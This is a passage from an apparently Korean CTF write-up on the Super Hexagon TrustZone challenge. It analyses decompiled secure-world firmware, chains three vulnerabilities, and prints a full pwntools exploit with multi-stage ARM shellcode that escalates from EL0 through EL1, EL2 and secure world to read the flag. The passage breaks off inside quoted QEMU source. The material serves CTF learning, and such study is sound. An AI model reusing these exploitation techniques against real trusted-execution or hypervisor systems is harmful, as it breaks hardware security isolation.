0x18)); } if (*(int *)(param_1 + 0x20) != 0) { FUN_08001944(*(undefined4 *)(param_1 + 0x1c),0,iVar2); } FUN_08001944(0xff8000,0,0x8000); Entry = *(dword *)(param_1 + 8); tci_handle = (TCI **)(*(int *)(param_1 + 0x20) + *(int *)(param_1 + 0x1c) + -4); return 0; } } return 0xffffffff; } 업로드 코드이다. 이상하게 디버깅해보면 자꾸 TCI handle을 secure VA로 넘긴다. 애초에 다른 world이고 translation 방식도 다른데, secure world의 VA를 넘기는게 이상하다. 유효하지 않은 주소를 보내면, DOS가 가능하다.\nsystem call interface도 공격 벡터가 될 수 있으니 다음 software interrupt handler를 분석해야한다.\nvoid FUN_08000a30(void) { uint32_t local_10; uint got_from_text; if ((_DAT_08085040 \u0026amp; 0x20) == 0) { got_from_text = *(uint *)(_DAT_0808503c + -4) \u0026amp; 0xffffff; } else { got_from_text = (uint)*(byte *)(_DAT_0808503c + -2); } local_10 = 0xffffffff; switch(got_from_text) { case 0: FUN_08000918(ctx.r0); break; case 1: local_10 = FUN_08000928(ctx.r0,ctx.r1); break; case 2: local_10 = FUN_08000964(ctx.r0,ctx.r1); break; case 3: local_10 = FUN_080009d6(ctx.r0,ctx.r1); } ctx.r0 = local_10; return; case 0은 normal world로 복귀할 때 이용한다. S-EL3에선 ctx.x0에 여기서 Secure application에서 넘긴 리턴 값을 Normal world로 옮긴다.\nundefined4 FUN_08000928(int r0,uint r1) { if ((r1 \u0026lt; 0x2400000) \u0026amp;\u0026amp; (r0 == 0xb)) { _signal_handler = r1; } return 0xffffffff; } case 1은 signal handler를 할당한다. 이때 검증이 world shared memory도 signal handler 등록이 가능하다.\nint FUN_08000964(uint r0,uint sz) { int VA; int iVar1; if (((((r0 \u0026amp; 0xfff) == 0) \u0026amp;\u0026amp; ((sz \u0026amp; 0xfff) == 0)) \u0026amp;\u0026amp; (sz != 0)) \u0026amp;\u0026amp; ((VA = FUN_0800054a(sz), VA != -1 \u0026amp;\u0026amp; (iVar1 = FUN_0800042e(VA,sz,10), iVar1 != -1)))) { FUN_08001944(VA,0,sz); } else { VA = -1; } return VA; } FUN_08000964는 다음과 같이 이용가능한 VA에 물리 주소를 매핑한다. case 2, 3은 메모리 매핑 및 언매핑 함수다. 공통적으로 다음 로직이 구현된다.\nint FUN_080005ac(void) { int iter; int local_c; local_c = -1; iter = 0; while ((iter \u0026lt; 0x20 \u0026amp;\u0026amp; (local_c = FUN_080005a2(v0[iter]), local_c == 32))) { iter = iter + 1; } if (local_c == 0x20) { local_c = -1; } else { v0[iter] = v0[iter] \u0026amp; ~(1 \u0026lt;\u0026lt; (0x1fU - local_c \u0026amp; 0xff)); local_c = local_c + iter * 32; } return local_c; } Secure VA를 페이지 테이블에서 제거할 때 right shift 17을 했었다. 그냥 비트맵을 확인하고 물리메모리가 비었으면 그 부분을 리턴한다. 2^12랑 곱하면 특정 비트에 해당하는 주소를 계산할 수 있다는 것을 알 수 있다.\nint FUN_08000684(void) { int iVar1; iVar1 = FUN_080005ac(); if (iVar1 == -1) { iVar1 = -1; } else { iVar1 = iVar1 * 0x1000 + secure_phys_max; } return iVar1; } Secure physical memory에 더해가면서 할당한다. S-EL1과 S-EL0는 Abort가 발생하면 똑같은 exception handler로 진입한다.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_08001588 (undefined param_1 , undefined par undefined r0:1 \u0026lt;RETURN\u0026gt; undefined r0:1 param_1 undefined r1:1 param_2 undefined r2:1 param_3 undefined r3:1 param_4 undefined Stack[0x0]:1 param_5 undefined Stack[0x4]:1 param_6 undefined Stack[0x8]:1 param_7 undefined Stack[0xc]:1 param_8 undefined Stack[0x10]:1 param_9 undefined Stack[0x14]:1 param_10 undefined4 Stack[0x3c]:4 param_11 XREF[1]: 08001588 (W) undefined4 Stack[0x40]:4 param_12 XREF[1]: 08001590 (W) undefined4 Stack[0x44]:4 param_13 XREF[1]: 0800159c (R) FUN_08001588 XREF[1]: thunk_FUN_08001588:08000010 (T) , thunk_FUN_08001588:08000010 (j) 08001588 3c e0 8d e5 str lr,[sp,#param_11 ] 0800158c 00 e0 4f e1 mrs lr,spsr 08001590 40 e0 8d e5 str lr,[sp,#param_12 ] 08001594 13 00 02 f1 cps #19 08001598 8a 00 00 eb bl FUN_080017c8 undefined FUN_080017c8(undefined 0800159c 44 80 9d e5 ldr r8,[sp,#param_13 ] 080015a0 1f 00 02 f1 cps #31 080015a4 08 d0 a0 e1 cpy sp,r8 080015a8 17 00 a0 e3 mov param_1 ,#0x17 080015ac 6b fd ff fb blx FUN_08000b62 undefined FUN_08000b62() 080015b0 b1 00 00 ea b FUN_0800187c undefined FUN_0800187c(undefined -- Flow Override: CALL_RETURN (CALL_TERMINATOR) spsr은 exception 발생시에 mode를 가리킨다.\nvoid FUN_08000b62(int param_1) { if ((param_1 == 0x17) \u0026amp;\u0026amp; (_signal_handler != -1)) { FUN_08000ae0(); _signal_handler = -1; } else { secure_monitor_call(0x83000007,0xffffffff); } return; } 복원한 구조체의 모습이다.\nvoid FUN_08000ae0(void) { if ((_signal_handler \u0026amp; 1) == 0) { ctx.cpsr = ctx.cpsr \u0026amp; 0b11111111111111111111111111011111; } else { ctx.cpsr = ctx.cpsr | 0b00100000; } ctx.pc = _signal_handler; ctx.r0._0_1_ = 0xb; ctx.r0._1_1_ = 0; ctx.r0._2_1_ = 0; ctx.r0._3_1_ = 0; return; } thumb mode 사용 여부에 따라 세팅된다.\n************************************************************* * FUNCTION ************************************************************* undefined FUN_0800187c (undefined param_1 , undefined par undefined r0:1 \u0026lt;RETURN\u0026gt; undefined r0:1 param_1 undefined r1:1 param_2 undefined r2:1 param_3 undefined r3:1 param_4 undefined Stack[0x0]:1 param_5 undefined Stack[0x4]:1 param_6 undefined Stack[0x8]:1 param_7 undefined Stack[0xc]:1 param_8 undefined Stack[0x10]:1 param_9 undefined Stack[0x14]:1 param_10 undefined4 Stack[0x40]:4 param_11 XREF[1]: 08001880 (R) FUN_0800187c XREF[5]: FUN_08000dbe:08000e5e (c) , FUN_08001530:08001558 (c) , FUN_0800155c:08001584 (c) , FUN_08001588:080015b0 (c) , FUN_080015b4:080015d8 (c) 0800187c 13 00 02 f1 cps #19 08001880 40 00 9d e5 ldr param_1 ,[sp,#param_11 ] 08001884 00 f0 6f e1 msr spsr_cxsf,param_1 08001888 f8 ff ff ea b LAB_08001870 ************************************************************* * FUNCTION ************************************************************* undefined FUN_08001818 (undefined param_1 , undefined par undefined r0:1 \u0026lt;RETURN\u0026gt; undefined r0:1 param_1 undefined r1:1 param_2 undefined r2:1 param_3 undefined r3:1 param_4 undefined Stack[0x0]:1 param_5 undefined Stack[0x4]:1 param_6 undefined Stack[0x8]:1 param_7 undefined Stack[0xc]:1 param_8 undefined Stack[0x10]:1 param_9 undefined Stack[0x14]:1 param_10 undefined4 Stack[0x34]:4 param_11 XREF[1]: 08001818 (R) undefined4 Stack[0x38]:4 param_12 XREF[1]: 0800181c (R) FUN_08001818 XREF[1]: FUN_080015b4:08001870 (c) 08001818 34 00 9d e5 ldr param_1 ,[sp,#param_11 ] 0800181c 38 10 9d e5 ldr param_2 ,[sp,#param_12 ] 08001820 1f 00 02 f1 cps #31 08001824 0d 20 a0 e1 cpy param_3 ,sp 08001828 00 d0 a0 e1 cpy sp,param_1 0800182c 01 e0 a0 e1 cpy lr,param_2 08001830 13 00 02 f1 cps #19 08001834 44 20 8d e5 str param_3 ,[sp,#0x44 ] 08001838 00 00 9d e5 ldr param_1 ,[sp,#0x0 ] 0800183c 04 10 9d e5 ldr param_2 ,[sp,#0x4 ] 08001840 08 20 9d e5 ldr param_3 ,[sp,#0x8 ] 08001844 0c 30 9d e5 ldr param_4 ,[sp,#0xc ] 08001848 10 40 9d e5 ldr r4,[sp,#0x10 ] 0800184c 14 50 9d e5 ldr r5,[sp,#0x14 ] 08001850 18 60 9d e5 ldr r6,[sp,#0x18 ] 08001854 1c 70 9d e5 ldr r7,[sp,#0x1c ] 08001858 20 80 9d e5 ldr r8,[sp,#0x20 ] 0800185c 24 90 9d e5 ldr r9,[sp,#0x24 ] 08001860 28 a0 9d e5 ldr r10 ,[sp,#0x28 ] 08001864 2c b0 9d e5 ldr r11 ,[sp,#0x2c ] 08001868 30 c0 9d e5 ldr r12 ,[sp,#0x30 ] 0800186c 1e ff 2f e1 bx lr LAB_08001870 XREF[1]: FUN_0800187c:08001888 (j) 08001870 e8 ff ff eb bl FUN_08001818 undefined FUN_08001818(undefined 08001874 3c e0 9d e5 ldr lr,[sp,#0x3c ] 08001878 0e f0 b0 e1 movs pc,lr movs pc, lr로 핸들러로 돌아간다. 이때 spsr에 대한 mode 체크가 없다는 취약점이 있다. 이 취약점을 악용하기 위해선 S-EL1에서 Access violation 관련 exception을 일으켜야 한다.\nGaining code execution 총 세 가지 취약점을 체이닝하면 임의 코드 실행을 얻을 수 있다.\nWorld shared memory mapping에 이용되는 메모리 권한 취약점. Signal exception handler 구현 취약점. Secure world user application upload에서 발생하는 DOS 취약점. Enhancing the exploitation stability 먼저 S-EL3까지 exploit 하기 위해선 shellcode를 넣을 공간이 필요했다. 기존 익스플로잇은 0x300 크기라서 그 이상가면 런타임에 memcpy가 덮히게 되고, qemu 3.0.0의 버그로 인해 디버깅이 아예 불가능하게 된다. 그래서 디버깅시엔 코드가 실행이 안되고, bp를 설정하지 않으면 코드가 실행이 된다. 결론적으로 불안정한 코드로 인해 발생한 버그라서 memcpy 보다 상위에 있는 코드 스니펫을 덮으려 시도했고, 성공적으로 덮었다. 이를 통해 S-EL0가 매핑되어있는 영역이 허용하는 한도 내에서 최대한 늘려 0x1900 바이트의 입력이 가능해졌다. 다음과 같이 수정했다.\nTCI_Data = b\u0026#39;\u0026#39; TCI_Data += p32(0xdeadbeef) * 8 + p32(0xdeadbeef) * 2 TCI_Data += p32(0) + p32(0x31) + p32(0x00000000e4990b0-8) + p32(0x0) + p32(0) + p32(0) + b\u0026#39;A\u0026#39; * 0x18# chunk 1 TCI_Data += p32(0) + p32(0x31) + p32(0x1670+8-0x10) + p32(0x0100060-0x8) + b\u0026#39;B\u0026#39; * 0x14 # chunk 2 ... mov w2, #5 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x1900, lsl 0 str w2, [x9, #8] // sz mov x8, #0x0 loop_copy: add x2, x21, x8 add x1, x20, x8 ldrb w0, [x1] strb w0, [x2] add x8, x8, #1 cmp x8, #{len(SEL0_shellcode)} bne loop_copy Exploit 시나리오 자체는 전과 비슷하다. 똑같이 secure에서 flag를 가져오고, 다시 Normal world로 복귀해서 flag를 출력한다.\nExploit code (code execution \u0026amp; flag) from pwn import * from keystone import * sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) context.binary = e = ELF(\u0026#39;./super_hexagon/share/_bios.bin.extracted/BC010\u0026#39;) ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN) sc_st = 0x7ffeffffd006 shellcode = b\u0026#39;\u0026#39; shellcode += bytes(ks.asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 mov w9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #0x1000 bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 mov x8, #0xe2 svc #0x1337 blr x11 \u0026#39;\u0026#39;\u0026#39;)[0]) assert b\u0026#39;\\r\u0026#39; not in shellcode and b\u0026#39;\\x0a\u0026#39; not in shellcode # p = remote(\u0026#39;localhost\u0026#39;,6666) p = process(\u0026#39;./local_debug.sh\u0026#39;) # p = process(\u0026#39;./local_debug_secure.sh\u0026#39;) payload = b\u0026#39;A\u0026#39; * 0x100 payload += p64(0xdeadbeef) payload += p64(e.sym.gets) # cmd = 1 sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0)) sla(b\u0026#39;key: \u0026#39;, payload) sleep(0.1) payload = b\u0026#39;A\u0026#39; * 0b101 + b\u0026#39;\\x00\u0026#39; payload += shellcode p.sendline(payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;, b\u0026#39;1\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(0x1000)) payload = b\u0026#39;\u0026#39; payload += b\u0026#39;A\u0026#39;*0b101 + b\u0026#39;\\x00\u0026#39; payload += b\u0026#39;A\u0026#39;*(0x100 - len(payload)) payload += p64(0xdeadbeef) payload += p64(e.sym.mprotect) payload += p64(sc_st) sla(b\u0026#39;key: \u0026#39;, payload) sla(b\u0026#39;cmd\u0026gt; \u0026#39;,b\u0026#39;2\u0026#39;) sla(b\u0026#39;index: \u0026#39;, str(1)) sleep(0.1) WORLD_SHARED_MEM_VA = 0x023fe000 SEL1_shellcode = b\u0026#39;\u0026#39; SEL1_shellcode += asm(f\u0026#39;\u0026#39;\u0026#39; mov r0, sp mrc p15, 3, r1, c15, c12, 0 str r1, [r0] mrc p15, 3, r1, c15, c12, 1 str r1, [r0, #0x4] mrc p15, 3, r1, c15, c12, 2 str r1, [r0, #0x8] mrc p15, 3, r1, c15, c12, 3 str r1, [r0, #0xc] mrc p15, 3, r1, c15, c12, 4 str r1, [r0, #0x10] mrc p15, 3, r1, c15, c12, 5 str r1, [r0, #0x14] mrc p15, 3, r1, c15, c12, 6 str r1, [r0, #0x18] mrc p15, 3, r1, c15, c12, 7 str r1, [r0, #0x1c] mov r11, #{(WORLD_SHARED_MEM_VA \u0026gt;\u0026gt; 16)\u0026amp;0xffff} // SHARED MEM lsl r11, r11, #16 orr r11, r11, #{WORLD_SHARED_MEM_VA\u0026amp;0xffff} // SHARED MEM mov r0, #1 strb r0, [r11] add r11, r11, #0xc mov r9, #0 loop: add r0, sp, r9 add r1, r11, r9 ldrb r0, [r0] strb r0, [r1] add r9, r9, #1 cmp r9, #32 bne loop ldr r0, =0x83000007 mov r1, #0 \u0026#39;\u0026#39;\u0026#39;, arch=\u0026#39;arm\u0026#39;) SEL1_shellcode += bytes.fromhex(\u0026#39;70 00 60 e1\u0026#39;) WORLD_SHARED_MEM_PA = 0x40033000 TCI_Data_addr = 0x4010225c SEL0_shellcode = b\u0026#34;\\x00\\xf0\\x08\\xe8\u0026#34; # thumb switch SEL0_shellcode += b\u0026#39;A\u0026#39;*0x10 SEL0_shellcode += asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov r10, #{((WORLD_SHARED_MEM_VA)\u0026gt;\u0026gt;16)\u0026amp;0xffff} lsl r10, r10, #16 orr r10, r10, #{(WORLD_SHARED_MEM_VA)\u0026amp;0xffff} add r10, r10, #0x10c mov r0, #0xb mov r1, r10 svc 0x1 svc 0x0 // return to normal world \u0026#39;\u0026#39;\u0026#39;,arch=\u0026#39;arm\u0026#39;) SEL0_shellcode += b\u0026#39;A\u0026#39; * (0x100 - len(SEL0_shellcode)) SEL0_shellcode += SEL1_shellcode SEL0_shellcode_src = 0x40035500 UART= 0x0000000009000000 read_flag = [1, 252, 59, 213, 1, 0, 0, 185, 33, 252, 59, 213, 1, 4, 0, 185, 65, 252, 59, 213, 1, 8, 0, 185, 97, 252, 59, 213, 1, 12, 0, 185, 129, 252, 59, 213, 1, 16, 0, 185, 161, 252, 59, 213, 1, 20, 0, 185, 193, 252, 59, 213, 1, 24, 0, 185, 225, 252, 59, 213, 1, 28, 0, 185] TCI_Data = b\u0026#39;\u0026#39; TCI_Data += p32(0xdeadbeef) * 8 + p32(0xdeadbeef) * 2 TCI_Data += p32(0) + p32(0x31) + p32(0x00000000e4990b0-8) + p32(0x0) + p32(0) + p32(0) + b\u0026#39;A\u0026#39; * 0x18# chunk 1 TCI_Data += p32(0) + p32(0x31) + p32(0x1670+8-0x10) + p32(0x0100060-0x8) + b\u0026#39;B\u0026#39; * 0x14 # chunk 2 EL2_shellcode = asm(f\u0026#39;\u0026#39;\u0026#39;\\ movz x11, #{((UART)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((UART)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((UART)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(UART)\u0026amp;0xffff}, lsl #0 mov x0, sp \u0026#39;\u0026#39;\u0026#39;) + bytes(read_flag) + asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x9, #0 loop: add x0, sp, x9 ldrb w0, [x0] strb w0, [x11] add x9, x9, #1 cmp x9, #32 bne loop movk x10, #{((WORLD_SHARED_MEM_VA)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(WORLD_SHARED_MEM_VA)\u0026amp;0xffff}, lsl #0 movz x9, #{((WORLD_SHARED_MEM_PA)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x9, #{((WORLD_SHARED_MEM_PA)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x9, #{((WORLD_SHARED_MEM_PA)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x9, #{(WORLD_SHARED_MEM_PA)\u0026amp;0xffff}, lsl #0 movz x20, #{((SEL0_shellcode_src)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x20, #{((SEL0_shellcode_src)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x20, #{((SEL0_shellcode_src)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x20, #{(SEL0_shellcode_src)\u0026amp;0xffff}, lsl #0 add x21, x9, #0xc // shellcode_dst, TCI buf payload mov x25, #0 alloc_loop: // alloc(i, 0x20, b\u0026#39;\u0026#39;) mov w2, #3 str w2, [x9] // cmd mov w2, w25 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x20, lsl 0 str w2, [x9, #8] // sz movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 add x25, x25, #1 cmp x25, #{3} bne alloc_loop mov x25, #2 free_loop: // free 2, 1, 0 mov w2, #3 str w2, [x9] // cmd mov w2, w25 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x40, lsl 0 str w2, [x9, #8] // sz movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 cmp x25, #{0} sub x25, x25, #1 bne free_loop //trigger the vuln mov w2, #3 str w2, [x9] // cmd mov w2, #0 str w2, [x9, #4] // idx movz w2, #0xffff, lsl 16 movk w2, #0xffff, lsl 0 str w2, [x9, #8] // sz movz x22, #{((TCI_Data_addr)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x22, #{((TCI_Data_addr)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x22, #{((TCI_Data_addr)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x22, #{(TCI_Data_addr)\u0026amp;0xffff}, lsl #0 mov x8, #0x0 loop_tci: add x2, x21, x8 // dst add x1, x22, x8 // src ldrb w0, [x1] strb w0, [x2] add x8, x8, #1 cmp x8, #{len(TCI_Data)} bne loop_tci movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 // unlink AAW trigger mov w2, #3 str w2, [x9] // cmd mov w2, #4 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x20, lsl 0 str w2, [x9, #8] // sz movz w2, 0x0010, lsl #16 movk w2, 0x0050, lsl #0 str w2, [x9, #16] // data + 4 str w2, [x9, #20] // this is needed to get out of the freelist loop. movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 // get .text mov w2, #3 str w2, [x9] // cmd mov w2, #5 str w2, [x9, #4] // idx movz w2, #0x0000, lsl 16 movk w2, #0x1900, lsl 0 str w2, [x9, #8] // sz mov x8, #0x0 loop_copy: add x2, x21, x8 add x1, x20, x8 ldrb w0, [x1] strb w0, [x2] add x8, x8, #1 cmp x8, #{len(SEL0_shellcode)} bne loop_copy movz x0, #0x8300, lsl 16 movk x0, #0x06, lsl 0 mov x1, x10 smc #0x1337 movz x0, #0x8300, lsl 16 movk x0, #0x05, lsl 0 ldr x1, =0x2000000 mov x2, #0x100 smc #0x1337 mov x8, #0x0 loop_print_flag_sel1: add x1, x21, x8 // dst ldrb w0, [x1] strb w0, [x11] add x8, x8, #1 cmp x8, #{0x20} bne loop_print_flag_sel1 \u0026#39;\u0026#39;\u0026#39;) EL2_shellcode += b\u0026#39;A\u0026#39; * (0x250- len(EL2_shellcode)) + TCI_Data EL2_shellcode = b\u0026#39;\\x41\u0026#39;*0xc+EL2_shellcode entry = 0xffffffffc001e000 + 0xf0 addr = 0xffffffffc00091b8 IPA = 0x2400 | (0b11\u0026lt;\u0026lt;6) # s2ap 11 DESC = 3 | 0x100000 EL2_TEXT = 0x00007ffeffffa000 entry_user = 0xffffffffc0028000 + 0xfd0 user_val = 0x2403 | 64 | 0x0020000000000000# ap 01 EL2_shellcode_addr = 0x7ffeffffc100 EL1_shellcode = asm(f\u0026#39;nop\u0026#39;)*(0x400//4) EL1_shellcode += asm(f\u0026#39;\u0026#39;\u0026#39;\\ mov x0, #1 movz x1, #{((IPA)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x1, #{((IPA)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x1, #{((IPA)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x1, #{(IPA)\u0026amp;0xffff}, lsl #0 movz x2, #{((DESC)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x2, #{((DESC)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x2, #{((DESC)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x2, #{(DESC)\u0026amp;0xffff}, lsl #0 hvc #0x1337 // PA 0x0000000040102000 RWX movz x11, #{((entry_user)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((entry_user)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((entry_user)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(entry_user)\u0026amp;0xffff}, lsl #0 movz x10, #{((user_val)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x10, #{((user_val)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x10, #{((user_val)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(user_val)\u0026amp;0xffff}, lsl #0 str x10, [x11] // IPA 0x0000000000002000 RW movz x11, #{((EL2_TEXT)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((EL2_TEXT)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((EL2_TEXT)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(EL2_TEXT)\u0026amp;0xffff}, lsl #0 movz x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x12, #{((EL2_shellcode_addr)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x12, #{(EL2_shellcode_addr)\u0026amp;0xffff}, lsl #0 mov x9, #0x0 loop: add x2, x11, x9 add x1, x12, x9 ldrb w0, [x1] strb w0, [x2] add w9, w9, #1 cmp x9, #{len(EL2_shellcode)} bne loop hvc #0x1337 // trigger!!! \u0026#39;\u0026#39;\u0026#39;) cnt = len(EL1_shellcode) val = 0x0040000000036483 shellcode = f\u0026#39;\u0026#39;\u0026#39;\\ mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 mov x11, x0 // IPA 0x36000 mov x9, #0x0 loop: add x1, x11, x9 mov x8, #0x3f mov x0, #0 mov x2, #0x1 svc #0x1337 add w9, w9, #1 cmp x9, #{cnt} bne loop mov x0, x11 mov x1, #0x1000 mov x2, #5 // r-x mov x8, #0xe2 svc #0x1337 mov x5, #-1 mov w4, #0x0 mov w3, #0x0 mov w2, #3 mov x1, #0x1000 mov x0, #0x0 mov x8, #0xde svc #0x1337 // IPA 0x37000 movz x11, #{((entry)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x11, #{((entry)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x11, #{((entry)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x11, #{(entry)\u0026amp;0xffff}, lsl #0 mov x0, #0 mov x1, x11 mov x8, #0x3f mov x2, #1 svc #0x1337 // now we can modify the kernel page table movz x10, #{((val)\u0026gt;\u0026gt;48)\u0026amp;0xffff}, lsl #48 movk x10, #{((val)\u0026gt;\u0026gt;32)\u0026amp;0xffff}, lsl #32 movk x10, #{((val)\u0026gt;\u0026gt;16)\u0026amp;0xffff}, lsl #16 movk x10, #{(val)\u0026amp;0xffff}, lsl #0 sub x11, x11, #0xa0 str x10, [x11] mov x8, #0x123 svc #0x1337 \u0026#39;\u0026#39;\u0026#39; payload = bytes(ks.asm(shellcode)[0]) payload += b\u0026#39;\\x41\u0026#39; * (0x100 - len(payload)) payload += EL2_shellcode assert len(payload) \u0026lt;= 0x500 payload += b\u0026#39;\\x41\u0026#39; * (0x500 - len(payload)) payload += SEL0_shellcode payload += b\u0026#39;\\x41\u0026#39; * (0x1000 - len(payload)) p.send(payload) sleep(0.1) p.send(EL1_shellcode) sleep(0.1) p.send(b\u0026#39;\\x43\u0026#39;) # AP 01 -\u0026gt; EL0 RW EL1 RW sleep(0.1) p.interactive() S-EL3, Secure monitor ************************************************************* * FUNCTION ************************************************************* undefined FUN_00000fa8 (undefined param_1 , undefined par undefined w0:1 \u0026lt;RETURN\u0026gt; undefined w0:1 param_1 undefined w1:1 param_2 undefined w2:1 param_3 undefined w3:1 param_4 undefined w4:1 param_5 undefined w5:1 param_6 undefined w6:1 param_7 undefined w7:1 param_8 undefined Stack[0x0]:1 param_9 undefined Stack[0x8]:1 param_10 undefined8 Stack[0x110]:8 param_11 XREF[1]: 00000fb0 (W) undefined8 Stack[0x120]:8 ELR_EL3 undefined8 Stack[0x118]:8 SPSR_EL3 XREF[1]: 00000fb8 (R) undefined8 Stack[0x100]:8 SCR_EL3 XREF[1]: 00000fb4 (R) FUN_00000fa8 XREF[3]: FUN_00000000:000000b0 (c) , FUN_00000c90:00000cb4 (c) , FUN_00002400:00002840 (c) 00000fa8 f1 03 00 91 mov x17 ,sp 00000fac bf 41 00 d5 msr PState.SP,#0x1 00000fb0 f1 8b 00 f9 str x17 ,[sp, #param_11 ] 00000fb4 f2 83 40 f9 ldr x18 ,[sp, #SCR_EL3 ] 00000fb8 f0 c7 51 a9 ldp x16 ,x17 ,[sp, #SPSR_EL3 ] 00000fbc 12 11 1e d5 msr scr_el3 ,x18 00000fc0 10 40 1e d5 msr spsr_el3 ,x16 00000fc4 31 40 1e d5 msr elr_el3 ,x17 00000fc8 f5 ff ff 17 b FUN_00000f9c undefined FUN_00000f9c(undefined -- Flow Override: CALL_RETURN (CALL_TERMINATOR) 전에 분석했을 때는 전혀 취약점이 보이지 않았었다. 지금 다시 보니 쉽게 구조적인 취약점을 발견할 수 있었다. 취약점 상세 내용은 다음과 같다.\nS-EL3의 일부 rw가 필요한 영역은 RAM에 적재된다. 그런데 context switching 시에 보호해야 할 시스템 레지스터들이 RAM에 올라와있다. 이런 구조는 절대 격리가 유지될 수 있는 구조가 아니다. 생각해낸 익스플로잇 시나리오는 다음과 같다.\nS-EL1 PTE 조작 → 쉘 코드 작성. S-EL1 PTE 조작 → S-EL3 PTE 조작 → 쉘 코드 페이지 매핑. S-EL1 PTE 조작 \u0026amp; tlb flush → ctx.pc, ctx.cpsr 변조. Secure monitor call → ACE. 여기서 세 번째 스텝이 tlb flush 인데 이건 같은 VA를 다른 PA에 매핑하기 위해 연속적으로 같은 VA에 접근해서 tlb가 캐싱되므로 이를 flush 하기 위해서 이용했다. qemu는 mmu를 프로세서와 완전 동일하게는 아니여도 범용적인 mmu를 softmmu라는 feature로 mmu 에뮬레이션을 지원하기에 꼭 필요한 스텝이다. static bool mmu_lookup1(CPUState *cpu, MMULookupPageData *data, int mmu_idx, MMUAccessType access_type, uintptr_t ra) { vaddr addr = data-\u0026gt;addr; uintptr_t index = tlb_index(cpu, mmu_idx, addr); CPUTLBEntry *entry = tlb_entry(cpu, mmu_idx, addr); uint64_t tlb_addr = tlb_read_idx(entry, access_type); bool maybe_resized = false; CPUTLBEntryFull *full; int flags; /* If the TLB entry is for a different page, reload and try again. */ if (!tlb_hit(tlb_addr, addr)) { if (!victim_tlb_hit(cpu, mmu_idx, index, access_type, addr \u0026amp; TARGET_PAGE_MASK)) { tlb_fill(cpu, addr, data-\u0026gt;size, access_type, mmu_idx, ra); maybe_resized = true; index = tlb_index(cpu, mmu_idx, addr); entry = tlb_entry(cpu, mmu_idx, addr); } tlb_addr = tlb_read_idx(entry, access_type) \u0026amp; ~TLB_INVALID_MASK; } full = \u0026amp;cpu-\u0026gt;neg.tlb.d[mmu_idx].fulltlb[index]; flags = tlb_addr \u0026amp; (TLB_FLAGS_MASK \u0026amp; 